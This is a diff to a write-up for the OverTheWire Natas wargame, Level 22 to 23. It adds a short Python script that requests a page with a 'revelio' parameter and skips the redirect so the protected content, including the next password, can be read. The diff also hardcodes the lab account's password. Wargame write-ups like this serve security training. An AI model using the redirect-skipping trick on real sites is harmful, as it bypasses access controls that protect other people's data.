@@ -716,8 +716,24 @@ The password for the next level will be found in the content of the page.
 
 ### Natas Level 22 → Level 23
 **Key Takeaways**  
-This level is quite similar to the previous one. Just change the URL just a bit.
+The source shows the revelio parameter triggers a redirect. For this, we need to disable automatic redirects for that GET request by using allow_redirects=False.
 
 **Procedure**
+
+1. Log in using the username `natas22` and the password from Level 21.
+
+2. Sample script (Credit: Dr4ks): https://github.com/Dr4ks/Natas_Labs_Solution
+
+```
+import requests
+
+target = 'http://natas22.natas.labs.overthewire.org/?revelio=1'
+auth = ('natas22', 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')
+
+session=requests.Session()
+response = session.get(target, auth=auth,allow_redirects=False)
+print(response.text)
+```
+The password for the next level will be found in the content of the page.
 
 
